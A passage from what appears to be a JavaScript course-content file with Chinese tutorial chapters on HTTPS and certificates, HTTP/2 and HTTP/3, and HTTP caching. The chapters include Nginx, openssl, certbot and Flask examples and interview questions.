- 握手时间从2RTT减到1RTT（快约100ms）
- 废除不安全算法（RC4、3DES、SHA-1、MD5、RSA密钥交换不支持前向安全）
- 强制前向保密（ECDHE）
- 更安全、更快

### 3.3 SNI（Server Name Indication）

一个IP托管多个HTTPS站点，TLS握手时客户端通过SNI扩展告诉服务器要访问哪个域名，服务器返回对应证书。

\`\`\`
Client Hello扩展：
Extension: server_name
  Server Name Indication extension
    Server Name: www.example.com
\`\`\`

---

## 四、证书体系（PKI/CA）

### 4.1 为什么需要CA

客户端怎么确定服务器公钥是真的？如果中间人在中间替换公钥，就能冒充服务器（中间人攻击）。

CA（Certificate Authority，证书颁发机构）解决这个问题：
1. 服务器向CA申请证书
2. CA验证服务器身份，用CA私钥签名服务器证书
3. 客户端（浏览器/操作系统）预置信任的根CA证书
4. 客户端用CA公钥验证服务器证书签名是否合法

### 4.2 证书链

证书是链式信任：

\`\`\`
根CA证书（内置在浏览器/系统，自签名）
    ↓ 签名
中间CA证书
    ↓ 签名
服务器证书（你的网站）
\`\`\`

验证过程：
1. 浏览器用内置的根CA公钥验证中间证书签名
2. 用中间CA公钥验证服务器证书签名
3. 验证域名、有效期等
4. 全部通过则信任

### 4.3 证书内容

服务器证书包含：
- 持有者信息（域名、公司）
- 服务器公钥
- 颁发者CA信息
- 有效期（90天/1年/2年）
- CA签名
- 用途（服务器认证、客户端认证）
- SAN扩展（支持多个域名）

可以用openssl查看：
\`\`\`bash
# 查看网站证书
openssl s_client -connect www.baidu.com:443 -showcerts

# 查看证书详情
openssl x509 -in cert.pem -text -noout
\`\`\`

### 4.4 获取免费证书：Let's Encrypt

Let's Encrypt提供免费SSL证书，用certbot自动申请和续期：

\`\`\`bash
# 安装certbot
brew install certbot  # macOS
sudo apt install certbot  # Ubuntu

# 申请证书（Nginx插件自动配置）
sudo certbot --nginx -d example.com -d www.example.com

# 自动续期（certbot会自动加定时任务）
sudo certbot renew --dry-run
\`\`\`

---

## 五、Python配置HTTPS

### 5.1 Flask/Django开发环境

开发时可以用自签名证书（浏览器会提示不安全）：

\`\`\`bash
# 生成自签名证书
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
\`\`\`

\`\`\`python
# Flask开发环境用HTTPS
from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello HTTPS!"

if __name__ == "__main__":
    app.run(ssl_context=("cert.pem", "key.pem"), port=443, debug=True)
\`\`\`

### 5.2 生产环境Nginx配置HTTPS

生产环境用Nginx处理HTTPS（证书放在Nginx），反向代理到后端HTTP：

\`\`\`nginx
server {
    listen 443 ssl http2;
    server_name example.com www.example.com;
    
    # 证书路径
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # TLS版本（只启用安全版本）
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    
    # SSL会话缓存
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # HSTS强制HTTPS（谨慎开启）
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# HTTP自动跳转HTTPS
server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;
}
\`\`\`

### 5.3 requests访问HTTPS

\`\`\`python
import requests

# 正常访问（验证证书）
resp = requests.get("https://www.baidu.com")
print(resp.status_code)

# 忽略证书验证（测试环境用，生产不要用！）
resp = requests.get("https://localhost:8000", verify=False)
# 会有InsecureRequestWarning警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 指定CA证书
resp = requests.get("https://internal-site", verify="/path/to/ca.pem")

# 客户端证书认证（mTLS）
resp = requests.get(
    "https://api.example.com",
    cert=("client.crt", "client.key")
)
\`\`\`

---

## 六、HTTPS性能问题

HTTPS比HTTP慢主要因为：
1. TLS握手增加1-2个RTT
2. 加解密有CPU开销

优化方式：
1. 启用TLS 1.3（1-RTT握手）
2. 会话复用：Session ID / Session Ticket
3. OCSP Stapling（减少证书验证时间）
4. HTTP/2（多路复用，一个连接多个请求）
5. 硬件加速（AES-NI指令集）
6. ECC证书（比RSA小，握手快）

现在HTTPS性能开销已经很小，现代网站应该全站HTTPS。

---

## 七、常见面试题

### HTTPS为什么比HTTP安全？

HTTPS通过TLS加密通信内容防窃听，用MAC校验防篡改，用数字证书验证服务器身份防冒充，解决了HTTP明文传输的三大安全问题。

### 说一下TLS握手过程？

TLS 1.2 RSA握手2-RTT：客户端发Client Hello（版本、加密套件、随机数），服务器回Server Hello+证书+公钥，客户端用公钥加密预主密钥发送，双方用三个随机数生成对称密钥，然后Finished消息验证，之后加密通信。TLS 1.3简化为1-RTT。

### 为什么需要CA？证书链是怎么验证的？

防止中间人攻击替换公钥。CA是可信第三方，用CA私钥签名服务器证书。浏览器内置根CA证书，用根CA公钥验证中间证书，中间CA验证服务器证书，链式信任。

### 对称加密和非对称加密的区别？HTTPS都用在哪里？

对称加密用同一个密钥，速度快但密钥分发难；非对称加密公钥私钥配对，速度慢但解决密钥分发。HTTPS握手时用非对称加密（RSA/ECDHE）传输对称密钥，通信时用对称加密（AES）传输数据。

### HTTP和HTTPS的区别？

- HTTP明文，HTTPS加密
- HTTP端口80，HTTPS端口443
- HTTP不需要证书，HTTPS需要CA证书
- HTTPS有TLS握手开销但更安全
- HTTPS影响SEO排名，现代网站应该全站HTTPS

---

## 八、本章小结

- HTTPS = HTTP + TLS，解决窃听、篡改、冒充三大风险
- 对称加密快但密钥分发难，非对称加密慢但解决密钥分发
- TLS握手协商加密套件，非对称加密传对称密钥，之后用对称加密通信
- CA证书体系保证服务器身份真实可信
- 证书链：根CA→中间CA→服务器证书，链式信任
- Let's Encrypt提供免费证书，certbot自动配置
- 生产环境Nginx处理HTTPS，后端用HTTP
- TLS 1.3更快更安全，推荐启用
- 现代网站应该全站HTTPS
`
  },
  {
    id: "pyb-2-7",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP/2与HTTP/3",
    content: `

# HTTP/2与HTTP/3

HTTP/1.1有性能瓶颈，HTTP/2和HTTP/3通过多路复用、头部压缩等提升性能。

## 一、HTTP/1.1的性能问题

### 1.1 队头阻塞（Head-of-Line Blocking）

HTTP/1.1虽然有Keep-Alive可以复用TCP连接，但一个连接同一时间只能处理一个请求，前一个请求没响应完后面的必须等（即使管道化Pipelining也要求响应按序返回）。

浏览器为了并发加载资源，会对一个域名开6-8个TCP连接，但连接多了握手开销大。

### 1.2 头部冗余

每个请求都要带完整的头部（Cookie、User-Agent等），很多头部重复，浪费带宽。

### 1.3 文本协议解析慢

HTTP/1.1是文本协议，解析效率低，容易出错。

---

## 二、HTTP/2核心特性

HTTP/2基于Google的SPDY协议，2015年标准化，主要特性：二进制分帧、多路复用、头部压缩、服务器推送。

### 2.1 二进制分帧

HTTP/2把报文分成二进制帧（Frame），而不是文本：
- 基本单位是帧（Frame），不同类型帧有不同用途
- 多个帧组成消息（Message），对应一个请求或响应
- 消息属于流（Stream），一个连接有多个流，每个流有唯一ID

\`\`\`
HTTP/2连接
├── Stream 1（请求CSS）
│   ├── HEADERS帧（请求头）
│   ├── DATA帧（响应数据）
│   └── ...
├── Stream 3（请求JS）
│   ├── HEADERS帧
│   └── ...
└── Stream 5（请求图片）
    ├── HEADERS帧
    └── ...
\`\`\`

帧类型：
- HEADERS：头部帧
- DATA：数据帧
- SETTINGS：配置帧
- PRIORITY：优先级
- RST_STREAM：重置流
- PING：心跳
- GOAWAY：关闭连接
- WINDOW_UPDATE：流量控制
- PUSH_PROMISE：服务器推送

### 2.2 多路复用（Multiplexing）

**HTTP/2最重要的特性！** 一个TCP连接可以同时处理多个请求响应，帧在连接上交错传输，不会互相阻塞：

\`\`\`
HTTP/1.1（6个连接）：
连接1: 请求1----------→响应1
连接2: 请求2---→响应2
连接3: 请求3------→响应3
...

HTTP/2（1个连接）：
连接: 请求1帧→请求2帧→请求3帧→响应2帧→响应1帧→响应3帧
     在同一个连接上交错传输，谁先处理完谁先返回！
\`\`\`

优点：
- 只需要一个TCP连接，减少握手开销
- 消除队头阻塞（应用层）
- 页面加载更快，尤其是多资源页面

注意：HTTP/2解决了HTTP层的队头阻塞，但TCP层仍有队头阻塞（丢包时整个连接的流都等待），HTTP/3解决了这个问题。

### 2.3 头部压缩（HPACK）

HTTP/2使用HPACK算法压缩头部：
- 静态表：预定义常见头部（如:method GET、:path /）
- 动态表：两端维护相同的头部表，重复出现的头部只传索引
- 霍夫曼编码：对字符串压缩

效果：头部可以减少80%+大小，尤其是带大量Cookie的请求。

### 2.4 服务器推送（Server Push）

服务器可以主动向客户端推送资源，不需要等客户端解析HTML后再请求：

\`\`\`
客户端请求/index.html
服务器同时发送：
  - index.html
  - PUSH_PROMISE: /style.css（推送CSS）
  - PUSH_PROMISE: /app.js（推送JS）
  - style.css
  - app.js
客户端收到HTML时CSS和JS已经在缓存了！
\`\`\`

但Server Push实际使用中效果不好（缓存判断复杂、带宽浪费），Chrome已经移除了支持，实际用的不多。

### 2.5 流优先级

客户端可以设置流的优先级，告诉服务器哪些资源先返回（CSS先于图片）。

### 2.6 HTTP/2 vs HTTP/1.1对比

| 特性 | HTTP/1.1 | HTTP/2 |
|------|----------|--------|
| 传输格式 | 文本 | 二进制 |
| 连接 | 多个TCP连接 | 一个TCP连接 |
| 并发 | 连接级，6-8个 | 多路复用，无限制 |
| 队头阻塞 | 有 | HTTP层无，TCP层有 |
| 头部 | 重复传输 | HPACK压缩 |
| 服务器推送 | 不支持 | 支持 |
| 加密 | 可选（实际都用） | 大多数浏览器强制HTTPS |

---

## 三、Nginx配置HTTP/2

\`\`\`nginx
server {
    listen 443 ssl http2;  # 加http2启用
    server_name example.com;
    
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # 推荐TLS配置
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # HTTP/2推送配置（可选）
    location / {
        proxy_pass http://127.0.0.1:8000;
        # http2_push /static/css/main.css;
        # http2_push /static/js/main.js;
    }
    
    # 静态文件
    location /static/ {
        root /path/to/static;
        expires 30d;
    }
}
\`\`\`

验证HTTP/2是否生效：
- Chrome DevTools → Network → Protocol列（h2）
- 命令行：curl -I --http2 https://example.com
- 在线工具：https://tools.keycdn.com/http2-test

### Python框架支持

- Flask/Django本身不需要特别处理，Nginx反向代理HTTP/2到后端HTTP/1.1即可
- Uvicorn支持HTTP/2：uvicorn main:app --http h2

---

## 四、HTTP/3与QUIC

### 4.1 HTTP/2的问题：TCP队头阻塞

HTTP/2虽然在HTTP层解决了队头阻塞，但TCP层仍然有队头阻塞：如果一个TCP包丢失了，整个连接上所有流都要等待这个包重传。

### 4.2 QUIC协议

HTTP/3不再基于TCP，而是基于**QUIC（Quick UDP Internet Connections）**，运行在UDP之上：

\`\`\`
HTTP/1.1:  HTTP → TCP → IP
HTTP/2:    HTTP/2 → TCP → TLS → IP
HTTP/3:    HTTP/3 → QUIC → UDP → IP
           (QUIC内置TLS 1.3)
\`\`\`

QUIC核心特性：

1. **内置TLS 1.3**：连接建立时同时完成加密握手，0-RTT/1-RTT建连
2. **流级别可靠性**：每个流独立，一个流丢包不影响其他流（解决队头阻塞）
3. **连接迁移**：基于Connection ID而不是IP端口，WiFi切4G连接不中断
4. **用户态实现**：不需要操作系统内核支持，更新迭代快

### 4.3 QUIC握手更快

\`\`\`
TCP+TLS 1.2握手：1RTT(TCP) + 2RTT(TLS) = 3RTT
TCP+TLS 1.3握手：1RTT(TCP) + 1RTT(TLS) = 2RTT
QUIC首次连接：1RTT（传输+加密握手同时完成）
QUIC重连：0-RTT（有缓存的密钥直接发数据）
\`\`\`

### 4.4 HTTP/3支持情况

- 浏览器：Chrome、Firefox、Safari、Edge都已支持
- 服务器：Nginx 1.25+支持，Cloudflare、Google、Facebook已大规模部署
- Python：Uvicorn实验性支持，aioquic库

Nginx配置HTTP/3（需要Nginx 1.25+）：
\`\`\`nginx
server {
    listen 443 quic reuseport;
    listen 443 ssl http2;
    server_name example.com;
    
    # 证书
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.3;
    
    # 告知客户端支持HTTP/3
    add_header Alt-Svc 'h3=":443"; ma=86400';
    
    location / {
        proxy_pass http://127.0.0.1:8000;
    }
}
\`\`\`

验证HTTP/3：
- Chrome：DevTools Protocol列显示h3
- curl：curl --http3 https://example.com

---

## 五、各版本HTTP对比总结

| 特性 | HTTP/1.0 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|------|----------|----------|--------|--------|
| 年份 | 1996 | 1997 | 2015 | 2022 |
| 传输层 | TCP | TCP | TCP | UDP(QUIC) |
| 连接模型 | 短连接 | 持久连接 | 多路复用 | 多路复用 |
| 队头阻塞 | 无（短连接） | 严重 | HTTP层解决 | 完全解决 |
| 头部 | 明文 | 明文 | HPACK压缩 | QPACK压缩 |
| 数据格式 | 文本 | 文本 | 二进制 | 二进制 |
| 加密 | 无 | 可选 | 实际必须 | 强制 |
| 握手RTT | 每请求 | - | 2RTT | 0-1RTT |
| 服务器推送 | 无 | 无 | 支持 | 支持 |
| 连接迁移 | 不支持 | 不支持 | 不支持 | 支持 |

---

## 六、迁移建议

1. **现在就应该全站HTTPS**（已经是标配）
2. **开启HTTP/2**（Nginx加个http2配置就行，收益大）
3. **HTTP/3**：可以开始测试，CDN（Cloudflare/阿里云CDN）已经支持，配置简单
4. 不需要重构应用，Nginx层处理协议升级，后端继续用HTTP/1.1即可

---

## 七、Python相关实践

### requests和HTTP/2

requests库默认不支持HTTP/2，需要安装httpx：

\`\`\`python
# pip install httpx[http2]
import httpx

# 同步HTTP/2请求
with httpx.Client(http2=True) as client:
    resp = client.get("https://www.google.com")
    print(resp.http_version)  # HTTP/2

# 异步HTTP/2
async with httpx.AsyncClient(http2=True) as client:
    resp = await client.get("https://www.google.com")
\`\`\`

---

## 八、常见面试题

### HTTP/1.1、HTTP/2、HTTP/3的区别？

HTTP/1.1是文本协议，有队头阻塞问题；HTTP/2是二进制分帧，一个TCP连接多路复用，HPACK压缩头部，但TCP层仍有队头阻塞；HTTP/3基于QUIC(UDP)，完全解决队头阻塞，内置TLS 1.3握手更快，支持连接迁移。

### HTTP/2的多路复用是什么？

HTTP/2把消息拆成二进制帧，一个TCP连接上可以同时交错发送多个请求响应的帧，不用按顺序等待，消除了HTTP层的队头阻塞，一个连接就可以加载所有资源。

### HTTP/2还需要域名分片吗？

不需要。HTTP/1.1需要域名分片开更多连接（如static1.example.com、static2.example.com）来并发加载，HTTP/2一个连接就够了，域名分片反而有害。

### QUIC基于UDP为什么可靠？

QUIC在UDP之上自己实现了可靠性机制：重传、拥塞控制、流量控制、有序交付，相当于把TCP的能力在用户态重新实现，同时解决了TCP队头阻塞问题，每个流独立。

### 为什么HTTP/3能更快？

1. 握手快：QUIC集成TLS 1.3，首次1-RTT，重连0-RTT
2. 队头阻塞解决：流级别的可靠性，丢包只影响一个流
3. 连接迁移：WiFi切4G不中断连接
4. 减少握手RTT，TLS更快

---

## 九、本章小结

- HTTP/1.1的主要问题是队头阻塞和头部冗余
- HTTP/2二进制分帧、多路复用、头部压缩，性能大幅提升
- HTTP/2一个连接处理所有请求，不需要域名分片
- HTTP/3基于QUIC(UDP)，完全解决队头阻塞，握手更快
- QUIC内置TLS 1.3，支持连接迁移
- Nginx配置HTTP/2很简单（加http2），HTTP/3需要1.25+
- 后端应用不需要改代码，Nginx层处理协议升级
- 现在就应该上HTTPS+HTTP/2，HTTP/3可以开始尝试
`
  },
  {
    id: "pyb-2-8",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP缓存机制",
    content: `

# HTTP缓存机制

缓存是性能优化的第一利器，通过复用已获取的资源，减少请求、降低延迟、节省带宽。

## 一、缓存的位置

缓存可以在多个位置：

| 位置 | 说明 | 谁控制 |
|------|------|--------|
| 浏览器缓存 | 内存/磁盘，最快 | 浏览器+服务器头部 |
| 代理缓存 | ISP/公司代理 | Cache-Control public |
| CDN缓存 | 边缘节点 | CDN配置+服务器头部 |
| 服务器缓存 | Redis/数据库缓存 | 应用自己控制 |

本章主要讲HTTP缓存（浏览器/CDN缓存）。

---

## 二、缓存的分类

### 2.1 强缓存（本地缓存）

浏览器检查本地缓存，如果没过期就**直接用缓存，不发请求到服务器**，返回200 (from disk cache/memory cache)。

相关头部：
- Cache-Control（HTTP/1.1，优先）
- Expires（HTTP/1.0，兼容用）

### 2.2 协商缓存（验证缓存）

强缓存过期后，浏览器发请求到服务器问"缓存还能用吗？"，服务器返回304 Not Modified就继续用缓存，否则返回新内容。

相关头部：
- Last-Modified / If-Modified-Since
- ETag / If-None-Match

---

## 三、强缓存详解

### 3.1 Cache-Control（HTTP/1.1）

Cache-Control是缓存控制的核心头部，多个值用逗号分隔。

**请求指令**：
\`\`\`
Cache-Control: no-cache     # 不直接用缓存，必须先验证
Cache-Control: no-store     # 完全不缓存
Cache-Control: max-age=0    # 等同于no-cache
Cache-Control: max-stale=3600  # 允许使用过期3600秒内的缓存
Cache-Control: min-fresh=60    # 要求缓存至少还有60秒有效期
\`\`\`

**响应指令**：
\`\`\`
Cache-Control: max-age=3600         # 缓存1小时（秒）
Cache-Control: no-cache             # 可以缓存但每次要验证
Cache-Control: no-store             # 完全不缓存（敏感数据）
Cache-Control: public               # 所有节点都可缓存（CDN/代理）
Cache-Control: private              # 只有浏览器可缓存（用户私有数据）
Cache-Control: must-revalidate      # 过期后必须验证才能用
Cache-Control: s-maxage=86400       # CDN缓存时间（覆盖max-age）
Cache-Control: immutable            # 资源永不变（哈希文件名）
\`\`\`

### 3.2 Expires（HTTP/1.0）

Expires设置绝对过期时间（GMT格式）：
\`\`\`
Expires: Thu, 01 Jan 2025 00:00:00 GMT
\`\`\`

缺点：依赖客户端时间，时间不一致会出错。HTTP/1.1用Cache-Control: max-age优先。

### 3.3 max-age计算

\`\`\`
Date: Wed, 01 Jan 2025 00:00:00 GMT  # 服务器响应时间
Cache-Control: max-age=3600          # 有效期1小时
# 本地有效期到 2025-01-01 01:00:00
# 01:00前用强缓存，01:00后走协商缓存
\`\`\`

---

## 四、协商缓存详解

### 4.1 Last-Modified / If-Modified-Since

基于**修改时间**：

1. 第一次请求，服务器返回Last-Modified（文件最后修改时间）
2. 浏览器缓存文件和Last-Modified
3. 下次请求带If-Modified-Since（值是之前的Last-Modified）
4. 服务器比较时间：没修改返回304，修改了返回200和新内容

\`\`\`
# 第一次响应
HTTP/1.1 200 OK
Last-Modified: Wed, 21 Oct 2023 07:28:00 GMT
Cache-Control: max-age=3600
(content...)

# 1小时后，强缓存过期，发协商请求
GET /style.css HTTP/1.1
If-Modified-Since: Wed, 21 Oct 2023 07:28:00 GMT

# 没修改，服务器返回304
HTTP/1.1 304 Not Modified
Cache-Control: max-age=3600
(没有响应体，浏览器用本地缓存)
\`\`\`

缺点：
- 文件内容没变但修改时间变了（重新生成、touch）会重新下载
- 时间精度是秒，1秒内多次修改检测不到

### 4.2 ETag / If-None-Match

基于**内容哈希/指纹**，解决Last-Modified的问题：

1. 第一次请求，服务器根据文件内容生成ETag（类似指纹）
2. 下次请求带If-None-Match（值是之前的ETag）
3. 服务器比较ETag：相同返回304，不同返回200

\`\`\`
# 第一次响应
HTTP/1.1 200 OK
ETag: "33a64df5"
Cache-Control: max-age=3600
(content...)

# 协商请求
GET /style.css HTTP/1.1
If-None-Match: "33a64df5"

# 没变化返回304
HTTP/1.1 304 Not Modified
ETag: "33a64df5"
\`\`\`

ETag优先级高于Last-Modified。

Flask中发送文件会自动处理ETag和304：
\`\`\`python
from flask import Flask, send_file

app = Flask(__name__)

@app.route("/static/<path:filename>")
def static_files(filename):
    # Flask自动设置ETag、Last-Modified，自动返回304
    return send_file(f"static/{filename}", conditional=True)
\`\`\`

手动处理304：
\`\`\`python
from flask import Flask, request, make_response
import hashlib

app = Flask(__name__)

@app.route("/api/data")
def get_data():
    data = get_data_from_db()
    content = json.dumps(data)
    
    # 生成ETag
    etag = hashlib.md5(content.encode()).hexdigest()
    
    # 检查If-None-Match
    if request.headers.get("If-None-Match") == etag:
        return "", 304
    
    resp = make_response(content)
    resp.headers["Content-Type"] = "application/json"
    resp.headers["Cache-Control"] = "max-age=60"
    resp.headers["ETag"] = etag
    return resp
\`\`\`

---

## 五、缓存策略设计

### 5.1 不同资源的缓存策略

| 资源类型 | 缓存策略 | Cache-Control |
|---------|---------|---------------|
| HTML页面 | 不缓存或短缓存 | no-cache 或 max-age=0, must-revalidate |
| 静态资源（JS/CSS/图片，带哈希） | 长期缓存 | max-age=31536000, immutable |
| 静态资源（不带哈希） | 协商缓存 | no-cache |
| API接口 | 不缓存或短缓存 | private, no-store 或 max-age=60 |
| 用户敏感数据 | 完全不缓存 | no-store |

### 5.2 哈希文件名实现长期缓存

前端构建（Webpack/Vite）会给文件名加内容哈希：
\`\`\`
main.abc123.js       # 内容变了哈希变
vendor.def456.css
logo.789xyz.png
\`\`\`

HTML中引用：
\`\`\`html
<script src="/js/main.abc123.js"></script>
<link href="/css/vendor.def456.css" rel="stylesheet">
\`\`\`

缓存策略：
- **HTML**：no-cache（每次访问验证，有更新就返回新HTML）
- **带哈希的JS/CSS/图片**：max-age=1年，immutable（内容变了文件名变，直接换URL）

这样更新发布后用户立即看到新版本，旧资源继续用缓存，完美！

Nginx配置：
\`\`\`nginx
# HTML：不缓存，每次验证
location / {
    root /path/to/dist;
    index index.html;
    add_header Cache-Control "no-cache";
    try_files $uri $uri/ /index.html;
}

# 带哈希的静态资源：缓存1年
location /assets/ {
    root /path/to/dist;
    expires 1y;
    add_header Cache-Control "public, immutable";
}
# 或者匹配文件扩展名
location ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2)$ {
    root /path/to/dist;
    expires 1y;
    add_header Cache-Control "public, immutable";
}
\`\`\`

### 5.3 API缓存

API接口通常不缓存或只做短缓存：

\`\`\`python
from flask import Flask, jsonify

app = Flask(__name__)

# 不经常变的数据可以短缓存
@app.route("/api/config")
def app_config():
    resp = jsonify(get_config())
    resp.headers["Cache-Control"] = "max-age=300"  # 缓存5分钟
    return resp

# 用户相关数据不缓存
@app.route("/api/me")
def me():
    resp = jsonify(get_current_user())
    resp.headers["Cache-Control"] = "private, no-store"
    return resp
\`\`\`

---

## 六、缓存验证流程

\`\`\`
浏览器请求资源
    │
    ├─→ 本地有没有缓存？
    │      │
    │      没有 → 发请求，获取资源+缓存标识 → 展示
    │      │
    │      有
    │      │
    │      └─→ 强缓存过期了吗？
    │             │
    │             没过期 → 直接用本地缓存（200 from cache）
    │             │
    │             过期了
    │             │
    │             └─→ 有没有ETag/Last-Modified？
    │                    │
    │                    没有 → 发请求获取新资源
    │                    │
    │                    有 → 发请求带If-None-Match/If-Modified-Since
    │                           │
    │                           ├─→ 304 Not Modified → 用本地缓存
    │                           │
    │                           └─→ 200 OK → 更新缓存和标识 → 展示新内容
\`\`\`

---

## 七、CDN缓存

CDN（内容分发网络）在全国各地有边缘节点，缓存静态资源，用户访问最近的节点。

### 7.1 CDN工作原理

\`\`\`
用户访问cdn.example.com/logo.png
    → DNS解析到最近的CDN节点
    → CDN节点有缓存？直接返回
    → 没有？回源到源站获取，缓存后返回
\`\`\`

CDN相关Cache-Control：
- s-maxage：CDN缓存时间（比max-age优先）
- public：允许CDN缓存
- private：禁止CDN缓存

\`\`\`
Cache-Control: public, s-maxage=86400, max-age=3600
# CDN缓存1天，浏览器缓存1小时
\`\`\`

### 7.2 CDN缓存刷新

发布新版本时需要刷新CDN缓存：
- 手动刷新CDN控制台
- 用带哈希的URL（最佳，不需要刷新）

---

## 八、缓存相关问题与坑点

### 8.1 用户看到旧版本

**问题**：更新发布后用户看到旧页面。

**解决**：
1. HTML不缓存（no-cache）或短缓存
2. 静态资源用哈希文件名
3. 必要时CDN刷新

### 8.2 缓存穿透

大量请求访问不存在的资源，CDN/缓存没有，请求全打到服务器。

**解决**：缓存空结果（短时间），布隆过滤器。

### 8.3 缓存击穿

热点key过期瞬间，大量请求同时打到服务器。

**解决**：
- 热点数据永不过期
- 加锁：只有一个请求回源，其他等
- 提前续期（异步更新缓存）

### 8.4 缓存雪崩

大量key同时过期，请求全打数据库。

**解决**：
- 过期时间加随机值，避免同时过期
- 多级缓存
- 服务熔断降级

---

## 九、常见面试题

### 强缓存和协商缓存的区别？

强缓存不发请求直接用本地缓存（200 from cache），用Cache-Control/Expires控制；协商缓存发请求到服务器验证，返回304就用缓存，用ETag/Last-Modified。强缓存过期了才走协商缓存。

### ETag和Last-Modified的区别？

Last-Modified基于文件修改时间，精度秒级，有漏洞；ETag基于内容哈希，更准确，优先级更高。

### Cache-Control: no-cache和no-store的区别？

no-cache是可以缓存，但每次用之前必须向服务器验证（协商缓存）；no-store是完全不缓存，不存任何缓存。

### 静态资源缓存策略怎么设计？

HTML用no-cache每次验证；JS/CSS/图片构建时加内容哈希，设置max-age=1年+immutable长期缓存。内容变了文件名变，URL变了就是新资源，天然解决缓存更新问题。

### 什么是CDN缓存？s-maxage的作用？

CDN是内容分发网络，边缘节点缓存静态资源，用户从最近节点访问。s-maxage是CDN专用缓存时间，优先级高于max-age，public允许CDN缓存，private禁止。

---

## 十、本章小结

- 缓存分强缓存和协商缓存
- 强缓存直接用本地缓存，不发请求（Cache-Control/Expires）
- 协商缓存发请求验证，304用缓存（ETag/Last-Modified）
- Cache-Control是HTTP/1.1缓存控制核心
- ETag比Last-Modified更准确
- 静态资源最佳实践：HTML不缓存+哈希资源长期缓存
- API根据敏感度设置缓存策略
- CDN缓存加速静态资源访问
- 注意缓存击穿、雪崩、穿透问题
`
  }
]
